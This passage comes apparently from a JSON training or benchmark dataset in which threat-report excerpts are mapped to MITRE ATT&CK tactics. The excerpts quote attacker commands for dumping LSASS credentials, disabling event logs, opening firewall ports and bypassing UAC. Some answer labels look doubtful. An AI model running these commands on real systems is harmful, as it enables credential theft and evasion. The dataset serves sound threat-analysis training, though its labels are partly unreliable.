pentest enumerations scripts available, such as:\nWMIC\nThe use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration. This can be useful to determine drives, including mounted network shares.\nThe dS.bat file was executed by the injected Rundll32.exe process.\nDuring hands-on discovery by the threat actors, the Group Policy was viewed by the Microsoft Management Console application to view Domain Group Policy Objects.\nThis can provide useful information concerning any restrictions or configuration settings for hosts on the network.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Thus far, Palo Alto Networks has observed 49 unique samples of the Gunpoder family. We have found three different groups of variants within this family. By comparing samples of the various Gunpoder variants, we were able to make many observations about the evolution of Gunpoder.\nSpecifically, variants of group 1 (12 samples) can propagate via SMS and entice users to make a payments. Variants of group 2 (16 samples) can only entice users to make a payment, and variants of group 3 (21 samples) do not contain SMS propagation or entice users to make payments. Group 3 was discovered to be the newest of the Gunpoder malware variants.\nFurthermore, the same certificate signed the first and second variants, while a different certificate signed the third variant. While the certificate varies between these groupings of variants, we highly suspect that the same malware author wrote all of these samples. A number of constant variables remain consistent between all three variants, such as the following that was identified in \"Constants.java.\"\nSHARE_CONTENT = \"a fun game\\uff0c^_^  http://goo.gl/KVhRwC\"\nFor a list of hashes of the three Gunpoder variants, please refer to the Appendix.\nWe observed that several samples mentioned above could be downloaded from two third-party app stores:http://www.aptoide.com/andhttp://www.mgccw.com.\nUsers will have a large bill, if they are tricked. The fake payment costs users only about $0.49 or $0.29, but the bill caused by sending SMS is much more than this. The total amount of the SMS bill depends on how many contacts reside in users' devices.",
        "output": "impact",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.\nCobalt Strike Beacon executables were transferred using SMB and executed via a remote service.\nOn other systems, PowerShell was used with the same remote service execution.\nTo facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 10 for command and control (C2). ",
        "output": "command and control",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the PowerShell script from the LNK file executed successfully, Emotet began execution. Emotet will initially copy itself to a randomly named folder in the users temporary folder.\nMultiple instances of Emotet spawning itself was observed over a period of three days. Almost all the instances of Emotet included three enumeration commands executed:\nTowards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE executable and executed. This access was used to perform enumeration and move laterally to other hosts.\nThe following diagram aims to provide an illustration of the execution chain with multiple instances of Emotet leading to Cobalt Strike.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed no evidence of direct privilege escalation. The threat actor attained domain administrator credentials on the NetScaler device via exploit and continued to expand credential access on the network. ",
        "output": "privilege escalation",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1027.003: Steganography   \nT1027.005: Indicator Removal from Tools   \nT1036.005: Match Legitimate Name or Location T1055.002: Portable Executable Injection   \nT1070: Indicator Removal on Host   \nT1070.001: Clear Windows Event Logs   \nT1070.006: Timestomp T1134.001: Token Impersonation/Theft   \nT1218.005: Mshta T1218.011: Rundll32   \nT1480: Execution Guardrails   \nT1497.003: Time Based Evasion   \nT1550.001: Application Access Token   \nT1562.001: Disable or Modify Tools   \nT1574.008: Path Interception by Search Order Hijacking ",
        "output": "defense evasion",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Multiple tools and scripts were used to access and collect credentials from compromised hosts. There were several variants of Mimikatz in binary and PowerShell form:\nCommands used to collect credentials and export to text files stored in the C:\\ProgramData folder included the following:\nDCSync\nCredentials were also dumped via DCSync using two compromised high privilege accounts. The activity was observed in Windows Security Event ID 4662, with known indicators including non-computer based account, an access mask of 0x100, and object IDs.\nDCSync was observed across 12 events, with separate events for each object ID. It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell.\nFor additional details,SpecterOps has an article covering the DCSync technique.\nCode injection in LSASS\nMultiple injections into the LSASS process were observed on multiple hosts.\nThreat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials.\nProcess dump of the LSASS process was undertaken using the Sysinternals ProcDump utility:\nThis process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.]191.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A file named Setup1.exe was dropped on multiple systems within the environment and executed using WMIC.\nIn an attempt to blend in, the Setup1.exe file acts as a fake installer for \"1Password\", a popular online password manager.\nLegitimate 1Password installer on the right, fake one on the left\nLegitimate 1Password installer on the right, fake one on the left)\nWhen the file is executed, it drops various files in the user's AppData directory, including \"filepass.exe\", which is started as a child process. It appears the threat actors used LPUB3D as a shell for this install, as all the folders and some of the dlls are from LPub3D, an Open Source WYSIWYG editing application for creating LEGO\u00ae style digital building instructions.\nFilepass.exe then loads an unsigned DLL named theora2.dll:\ntheora2.dll reads the data from an XML-file named \"cds.xml\". This file is stored in the same directory (AppData\\Roaming\\1Password).\nThis file seems to contain the XML documentation (in Russian) of theSystem.IOpackage.\nIf we scroll down in the XML-file, we will find data patterns which seem to be obfuscated and unreadable:\nA subset of the file buffer (cds.xml), which contains the obfuscated data patterns, is saved into a separate memory location.\nThe obfuscated/encrypted shellcode is then sent into a Cobalt Strike named pipe.  In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike. Pipes being created with the name MSSE-*-server are a great indicator to hunt for.\nFrom here, the CS stager used the WinInet API in an attempt to fetch a Cobalt Strike beacon hosted on windowsupdatesc[.]com.\nIn the raw shellcode we can find the URI and the User-Agent:\nThe HTTPS beacon spawned by filepass.exe continues to check in every ~5 seconds.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first stage of the IcedID malware that was executed on the host was dropped via a macro enabled Word document  as seen by Unit42.\nIOCs from Bradhere.\nIn our case, theIcedID dll loaderwas manually executed using regsvr32.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Gootloader\nBefore hands on keyboard activity, Gootloader ran a number of PowerShell Cmdlets to collect basic host information.\nThe first section collected environmental data from the host using env:\nNext the host operating system using Get-WmiObject:\nFollowed by running processes with a filter for maintitlewindow using Get-Process.\nNo filter:\nWith filter:\nAnd a disk space check using Get-PsDrive:\nRDP Port Discovery\nAdvanced IP Scanner (https://www.advanced-ip-scanner.com/) was executed from a compromised account and then used to look for systems with RDP (3389) open.\nLDAP\nThe DLLHost process (Cobalt Strike beacon) undertook several LDAP (Lightweight Directory Access Protocol) queries using port 389 and 3268.\nShares Enumeration\nScanning all the network endpoints for the presence of shared folders was undertaken. This is a common technique we've observed in other similar cases to discover and collect information of interest, i.e., credentials and confidential information.\nPing\nThe DLLHost (Cobalt Strike beacon) conducted several ping sweeps across endpoints using the 'ping' command:\nThe use of the ping command had several unusual indicators. The command was executed from a SYSTEM account, and a conhost process was created with no attached console session [https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-wtsgetactiveconsolesessionid#return-value]\nMultiple executions of 'ping' using these indicators:\nAD Groups\nThe threat actor enumerated the \"Remote Management Users\", \"Remote Desktop Users\", \"Local Administrators\" and \"Distributed COM Users\" groups.\nPowerSploit\nPowerView Cmdlets as part of PowerSploit were observed being used to discover the domain configuration. Observed Cmdlets included Get-DomainFileServer and Get-DomainSearcher. This was passed as a base64 encoded value, from a user context of SYSTEM. The Base64 value SQB is a common indicator of the IEX keyword, often used for downloading of files.\nThe command:\nDecoded as:\nThe use of a loop back IP address [127.0.0.1] indicated that the script was delivered through its own implant [dllhost]. Details of the command usehere.\nInvocation of Get-DomainSearcher function as a part of the Get-DomainFileServer execution:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To obtain initial access [TA0001], Volt Typhoon actors commonly exploit vulnerabilities in networking appliances such as those from Fortinet, Ivanti Connect Secure (formerly Pulse Secure), NETGEAR, Citrix, and Cisco [T1190]. They often use publicly available exploit code for known vulnerabilities [T1588.005] but are also adept at discovering and exploiting zero-day vulnerabilities [T1587.004]. \n\u2022 In one confirmed compromise, Volt Typhoon actors likely obtained initial access by exploiting CVE-2022-42475 in a network perimeter FortiGate 300D firewall that was not patched. There is evidence of a buffer overflow attack identified within the Secure Sockets Layer (SSL)-VPN crash logs. \nOnce initial access is achieved, Volt Typhoon actors typically shift to establishing persistent access [TA0003]. They often use VPN sessions to securely connect to victim environments [T1133], enabling discreet follow-on intrusion activities. This tactic not only provides a stable foothold in the network but also allows them to blend in with regular traffic, significantly reducing their chances of detection. ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: SideWinder has been observed initiating attacks with spear phishing emails against their target organizations. Attacks are primarily delivering malicious attachments, but credential phishing has also been a technique used by the group. The December 2020 blog from Trend Micro does an excellent analysis of the phishing websites. Ultimately, these websites are used to collection credentials and occasionally deliver similar files to the attachments detailed below. \nEmail lures and their attachments or links are often uniquely crafted to the target organization, which include content that the recipients would often expect to receive or benefit from reading. Since the group has primarily targeted government and military organizations, email lures are often related to political events and/or private documents generally considered standard for such organizations to receive. Figure 1 includes a screenshot of the complete content from an April 2019 campaign phishing email (SHA256: \nbe71f2d17037a1a1fbbe8d7f3f4b45c72132a64224e3d3f13aa66a2249df9232) with attachment (SHA256: ac4fd2681c3a9d087ff4cabb44b93753711e81c6574c837ca33f74fef37f3cf4). \nMalicious attachments are the standard approach over the use of malicious links in phishing emails.   \nAttachments have most commonly been RTF files, and less commonly DOCX, LNK, and ZIP files. ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed lateral movement using three main tools and techniques, including Impacket's wmiexec, PowerShell using WinRM service and Microsoft Remote Desktop. \nImpacket's WMIExec provides a shell on remote systems that have the WMI service exposed. We observed its use in both the BlackCat and BlackMatter attacks. This tool's activity can be detected by detecting processes created by wmipsrv.exe that terminate with the following string: \n1> \\\\127.0.0.1\\admin\\$\\__<timestamp>.<6 digits> 2>&1 \nThis tool was often used to issue a command to allow WinRM service network connections through the firewall, possibly for the convenience of using some prepared scripts: \ncmd.exe /q /c netsh advfirewall firewall add rule name=service dir=in protocol=tcp localport=5985 action=permit 1> \\\\127.0.0.1\\c\\$\\windows\\temp\\qaiumg 2>&1 \nWinRM allows attackers to use PowerShell to execute commands on remote machines. This tool can be detected by searching for processes started by \"wsmprovhost.exe\". Below, there's a few examples of WinRM being used for lateral movement, in this case, to disable logging of many Windows services: \nc:\\windows\\system32\\wevtutil.exe set-log active directory web services /enabled:false c:\\windows\\system32\\wevtutil.exe set-log application /enabled:false c:\\windows\\system32\\wevtutil.exe set-log hardwareevents /enabled:false c:\\windows\\system32\\wevtutil.exe set-log internet explorer /enabled:false \nMicrosoft Remote Desktop was also used by the attackers to obtain GUI access to systems. The following impacket command was issued before the adversary could gain remote admin access. \ncmd.exe /q /c reg add hkey_local_machine\\system\\currentcontrolset\\control\\lsa /v disablerestrictedadmin /t reg_dword /d 0 1> \\\\127.0.0.1\\admin\\\\$\\__<timestamp>\\.<num> 2>&1 \nOther lateral movement techniques observed include PsEexec on both attacks and RemCom - an open-source version of psexec - during the BlackMatter attack. ",
        "output": "lateral movement",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The injected svchost process dropped two files: a batch-file named: \"95.bat\" and a DLL-file named: \"95.dll\". Both files were copied to the ProgramData folder of another system within the environment.\nThe content of the batch file can be seen belowit executes the transferred DLL and then deletes itself:\nTo execute the batch file, the threat actor installed, and started, a remote service on the other system.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this intrusion the threat actors usedBitLockerand an open source encrypter,DiskCryptor,in order to encrypt systems domain wide. On servers a batch script named setup.bat was used and on workstations the GUI application named dcrypt.exe(DiskCryptor) was executed instead. Both were executed via the threat actors after RDP login to each host.\nOn servers they copied over a file named setup.bat.\nThey then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.\nBelow are the commands executed by the script:\nRunning this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:\nA binary called dcrypt.exe, was dropped on a backup server and immediately deleted. While this utility was not executed on any servers in the environment it was deployed to all the workstations.\nThe executable used is thecurrent releaseof the installer for the utility DiskCryptor.\nWe are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.\nhttps://en.wikipedia.org/wiki/BitLocker\nUse of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.\nThis executable, however, reminds you on install that it is \"beta\" software.\nThe setup process then works as most windows installers and requires a reboot of the system. During installation a kernel mode driver is added to support the encryption process.\nAfter reboot, the program GUI allows you to configure the encryption options.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: If the account that Volt Typhoon compromises from the Fortinet device has privileged access, they use that account to perform the following credential access activities. \nMicrosoft has observed Volt Typhoon attempting to dump credentials through the Local Security Authority Subsystem Service (LSASS). The LSASS process memory space contains hashes for the current user's operating system (OS) credentials. \ncmd.exe /c powershell -exec bypass -W hidden -nop -E cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdAB1A G0AMwAyAFwAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAA1ADUAMg AgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdgBtAHcAYQByAGUALQB2AGgAbwBzAHQ ALgBkAGOAcAAgAGYAdQBsAGwA \nrundl132.exe C:\\Windows\\System32\\comsvcs.d1l, MiniDump 552 C:\\Windows\\Temp\\vmware-vhost.dmp full \nVolt Typhoon also frequently attempts to use the command-line tool Ntdsutil.exe to create installation media from domain controllers, either remotely or locally. These media are intended to be used in the installation of new domain controllers. The files in the installation media contain usernames and password hashes that the threat actors can crack offline, giving them valid domain account credentials that they could use to regain access to a compromised organization if they lose access. ",
        "output": "credential access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 7 to learn more about the victim environments. ",
        "output": "discovery",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Our telemetry shows that that Earth Kurma targeted victims primarily in Southeast Asia, including the Philippines, Vietnam, Thailand and Malaysia. Earth Kurma's targets likely indicate cyberespionage as the motivation.",
        "output": "impact",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Valid Account\nSonicWall Scanner:The server contained a ZIP file called sonic_scan.zip, in which a Python script and a file, data.txt, with potentially compromised VPN credentials were present, that had the following structure:\nTarget IP Address \nUsername \nPassword \nDomain Name \nVPN Software\nThe script sonic_scan/main.py allows the threat actor to authenticate to SonicWall VPN appliances and execute a port scan by performing the following actions:\nReads and parses data.txt to get the IP address, username, password and domain name (if any) of the target appliance. \nFor every entry in data.txt, which represents a potential valid account, obtains the domain name associated with the specific IP address and then executes the NetExtender process to login into the target VPN. NetExtender is a SonicWall command-line utility which allows access a VPN server. Specifically, NetExtender is executed via this command-line: netextender <target IP address> username <target username> password <username password> domain <target domain name> always-trust . \nAfter the execution of NetExtender, the script parses the output produced by the VPN and, if the connection was successful, a loop is initiated until the string \"NetExtender connected successfully\" is found. During this loop, IP addresses are extracted and appended to a list which is then provided to Nmap for port scanning. \nOnce the Nmap scan is completed, the NetExtender process is terminated.\nArctic Wolfalso linked the usage of compromised SonicWall credentials to Fog Ransomware.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After loading IcedID DLL via the renamed rundll32, the following discovery commands were observed on the beachhead host:\nAs a part of discovery commands, IcedID used WMI to get the list of Anti-Virus product installed on the beachhead host with the following command:\nThe threat actor also ran the following discovery commands via cmd.exe (injected Beacon process):\nAdFind was used for discovery on a domain controller via a batch script named adfind.bat. The script executed the following commands:\nAfter running this, the threat actor dropped a new batch file ns.bat. This file contained a list of hosts on the network to perform DNS lookups using nslookup.\nShortly before beginning the ransomware deployment, the threat actor connected to a backup server and opened the backup console on the host. This was followed by final discovery action on the domain controller with theSoftPerfect Netscantool being used for a final discovery scan across the network.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After dropping a copy of itself, it executes the dropped copy as Administrator using a UAC (User Account Control) bypass technique. It implements a variation of the technique ucmDccwCOMMethod in UACMe, thereby abusing the built-in Windows AutoElevate backdoor. \nIt first checks whether atcuf32.dll, aswhook.dll, and avp.exe are loaded in the system. These files are from security defenders BitDefender, Avast, and Kaspersky, respectively. If one of these is loaded, it does not proceed to the UAC bypass routine. It then drops a shortcut file to <%User Temp%\\{random file name}.lnk> that contains the command line \nrundll32.exe SHELL32,ShellExec_RunDLL   \n\"C:\\Windows\\system32\\ODBCCONF.EXE\" /a {configsysdsn OCNKBENXGMI   \netba odjcnr} /A {installtranslator fxodi} -a {installdriver   \nqmprmxf} /a {configsdn HHAP} regsvr \"{dropped copy path and file   \nname}.\" /S /e -s \nIt then creates an elevated COM object for CMLuaUtil and uses it to set a custom display calibrator in the registry that points to the dropped LNK file. It sets the custom display calibrator by setting the registry value ",
        "output": "privilege escalation",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: impersonate executives, colleagues, or even IT support personnel to trick victims into revealing confidential information, granting remote access to systems, or transferring funds. The inherent trust associated with a familiar voice can be exploited to manipulate victims into taking actions they would not normally take, such as clicking on malicious links, downloading malware, or divulging sensitive data. Although voice-based trust systems are seldom used, AI-spoofed voices can also potentially bypass voice-based authentication systems used for multi-factor authentication or password resets, granting unauthorized access to critical accounts. ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mass phishing and grayware campaigns have become more sophisticated, using evasion techniques to escape detection by automated security crawlers. Fortunately, when malicious actors use infrastructure, services or tools across their ecosystem of malicious websites, we have a chance to leverage these indicators against them. CAPTCHA identifiers are one great example of such detection by association.\nPalo Alto Networks continually monitors CAPTCHA IDs as one example of a malicious indicator, and we use it to detect phishing, malware and grayware pages. Palo Alto Networks Next-Generation Firewall customers withAdvanced URL Filtering andWildFire security subscriptionsare protected against such sophisticated phishing campaigns.\nBelow is the list of top 10 popular Captcha ID signatures for the period April 18-May 18.6LcEthAUAAAAANLeILVZiZpPDbVwyoQuQ7c3qlsy6LcJK64UAAAAAKwjDYyWpakQ_5aFAb34tK-EkiDA6Le-dsYUAAAAABJa32oIuo9LEPsur7OcBz-a9kyL6LfKnxEUAAAAAO1iXBX9FqL0w-68XqXGl3UPBF5p6Lc8-cQUAAAAAF60sMK0PjhPOA6ciyzy6cfnGcl06LeihuEUAAAAAEgMRhYQKQCxnJvsqIZnRghJAPcH6LezpHMUAAAAALunasQAvKdhRwFC1oqRE0OZW8f46LdkVo0aAAAAAN5yxjGbJPH39rF--s6ZVsl_LxzE6LdVFrgUAAAAAEMNq1ljl8HZSQ2sA8Hu6a8umPQr6LfrPbMUAAAAAF2DLXNWH8-s0Ln08lXtaX9k1tRC\nThe list of all IOCs can be found onGitHub.\nWe'd like to thank Unit 42 for helping us with this blog. Special thanks to Bahman Rostamyazdi, David Fuertes, Taojie Wang, Tao Yan and Hector Debuc for helping us with the data.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the overnight hours of the 2nd day the threat actors began moving on their final objectives. This included testing their ransomware in the compromised environment before deploying across the domain.\nThey initiated RDP connections and a Cobalt Strike beacon executable file to a endpoint not yet interacted with by the threat actors. The threat actor then transferred a Conti executable file to several endpoints named test.exe.\nThese test ransom files were then called remotely using wmic as seen in the previous lateral movement activity.\nAfter testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.\nWhen executed in this manner, the ransomware payload attempts to spread laterally over SMB.\nFrom there, the threat actors left the environment with this note and domain wide encryption completed about 32 hours after the initial beachhead BazarLoader was executed.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Talos IR observed that EDR was disabled on some of the compromised servers in the victim environment during the investigation. According to the indicators seen, Talos IR believes that the attacker could have either leveraged an EDR uninstaller tool or instrumented a vulnerable device driver Sysmon.sys (TfSysMon.sys) to disable the EDR on the victim machine. We also observed the attacker's attempts to delete contents of the Event logs on some of the compromised systems. ",
        "output": "defense evasion",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ScreenConnect\nOnce IcedID was operational, the threat actor used it to install the RMM tool ScreenConnect, renamed as toovey.exe.\nThroughout the intrusion the threat actor dropped several more renamed ScreenConnect installers, usually employed after moving laterally to a new host and then executing it through Impacket's wmiexec.py script:\nBesides execution with wmiexec.py, some installers were executed during the threat actor RDP sessions:\nScreenConnect was then used to execute various commands. This can be observed in logs, as ScreenConnect drops the desired script on disk, followed by the corresponding interpreter, as discussed in a previousreport. This can be seen in various events, such as Security Event ID 4688 or Sysmon Event 1, as displayed below.\nCobalt Strike\nAs in most intrusions we document, Cobalt Strike beacons were used in this intrusion. On the beachhead host, using ScreenConnect, the threat actor tried to download malicious Cobalt Strike beacons using bitsadmin, without success.\nBesides process creation event logs, bitsadmin downloads can also be detected via event ID 59 and 60 of \"Microsoft-Windows-Bits-Client/Operational\" log.\nFollowing this failure, they used another LOLBin named certutil to download their payloads, again via ScreenConnect. This behavior was repeated to download other Cobalt Strike beacons.\nPowerShell was another tool used to retrieve Cobalt Strike beacons, again with some failures, and yet again using ScreenConnect.\nIn addition to the previously mentioned methods of retrieving additional payloads, there was another instance where the attackers usedtemp.shto host their malware. However, a failure occurs when attempting to directly download a file from these links. Instead of obtaining the actual file, users end up downloading an HTML presentation page that prompts them to click a link to retrieve the file.\nOn another occasion, PowerShell usage was successful, and in those cases using Sysmon's events we can trace child processes from PowerShell ParentCommandLine. For instance, the following display shows a payload used to launch https64.dll, another Cobalt Strike beacon.\nBecause the beacon was using plain HTTP, the retrieved PowerShell payload can be extracted from the network communications.\nAs documented inCobalt Strike, a Defender's Guide part 1andpart 2, the attackers used Cobalt Strike's default pipe names, which can be easily detected.\nImpacket\nAs part of their toolkit, the threat actor used Impacket's wmiexec.py script to perform actions. This activity can be easily observed in logs because of the default redirect of its output to \\\\127.0.0.1\\ADMIN$\\__%timestamp% (as visible in thesource code).\nCSharp Streamer\nDuring the intrusion, the threat actor deployed a binary named \"cslite.exe\" on the beachhead host. Upon investigation, we identified this binary as a RAT known as CSharp Streamer, thanks to an excellentwrite-upby Hendrik Eckardt. This malware combines many different functions and is a very capable remote access trojan. During this intrusion, we observed it dumping credentials, proxying RDP traffic, and providing command and control communications for the threat actor.\nWe were able to confirm the tool using memory analysis, and identifying known functions and commands in the previously linked report.\nWhen executed, the tool writes a .NET executable to the %USERPROFILE%\\AppData\\Local\\Temp folder using a .tmp extension and then loads it into memory, as seen in the Sysmon Event ID 7 event:\nUsing dynamic analysis from running the sample in a malware analysis sandbox, we can observe the injected .NET assemblies:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The final actions of the threat actor were not observed, however, the data exfiltrated from the network could be used to conduct further attacks or sold to 3rd parties.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cobalt Strike\nThe Cobalt Strike server used for this intrusion has been tracked in the DFIR Reportthreat intelligence feedbefore the incident occured.\nCS Stager\nDuring the intrusion, we also observed the malicious PowerShell execution that contains base64 strings from the domain controller.\nAfter decoding the base64 strings using CyberChef, the output generated looks cleaner. However, we also noticed the second layer of the obfuscation on the output below.\nAfter initial Base64 decoding, we found the payload used the default Cobalt Strike XOR value of 35, allowing for the next step of decoding the payload based on the output below.\nAfter decoding the second layer of obfuscation using the XOR key of 35, we have the next layer of base64 strings. We can use the XOR key 35 to decode this again. We can use the below CyberChef recipe as our next step.\nThe data can be saved and parsed using the1768.pytool from Didier Stevens that reveals the Cobalt Strike stager configuration, including the C2 IP (91.215.85[.]143) and the license-ID (watermark) (206546002), which is a well-known watermark used inmultiple attacksbased on our previous published reports.\nThe beachhead host using a Cobalt Strike beacon, injected into PowerShell and DLLHost processes; these served as the main ingress and egress command and control channel to 91.215.85[.]143:443\nCS HTTP Beacon\nThe threat actor used Cobalt Strike HTTP Beacons for command and control communication. Three separate hosts were infected with a Cobalt Strike HTTP beacon communicating to IPv4 91.215.85[.]143:443.\nCobalt Strike HTTP Beacon configuration:\nCobalt Strike SMB Beacon\nThe threat actor also used Cobalt Strike SMB beacons to chain beacons together for lateral movement. We observed four hosts where Cobalt Strike SMB beacons were used.\nCobalt Strike SMB beacon configuration:\nSystemBC\nDuring the intrusion a PowerShell script named 's5.ps1' was dropped to a users 'AppData\\Roaming' folder.\ns5.ps1 turned out to be a PowerShell version of SystemBC as described byProofpoint. This PowerShell version has been appearing more frequently over the past few years [1,2,3].\nHaving a PCAP of the traffic, we could decrypt it and see that inside, it was running SOCKS v5 traffic.\nThe first 50 bytes of the first data packet are the encryption key starting with 0x00 and ending with 0x3a:\nUsing that key to decrypt the first answer packet shows that this is SOCKS v5 traffic and it also reveals the domain:\nApproximately four minutes after the script was dropped, SOCKS (SystemBC) was utilized to tunnel network connections from the external IPv4 91.92.136[.]20:4001 to the domain controller via a compromised endpoint. The endpoint was configured to execute a PowerShell script [s5.ps1] that established a SOCKS connection to the attacker-controlled infrastructure.\nThe process and C2 activity can be illustrated as:\nThe script had the following indicators for the IPv4 and Port:\nThe SOCKS tunnel provided the following connectivity from the attacker computer and allowed RDP [3389] to be traversed externally.\nA side effect of utilizing a proxy (SOCKS tunnel) on the endpoint is unusual port allocations, for example, PowerShell talking to port 3389. In this case, RDP was used to tunnel to the Domain Controller via the PowerShell process, which used port 3389.\nThe activity did expose the attacker's computer name via Windows eventID 4778, with the name being 'DESKTOP-GRALDC5'. The client address referred to the proxy endpoint, an private IPv4 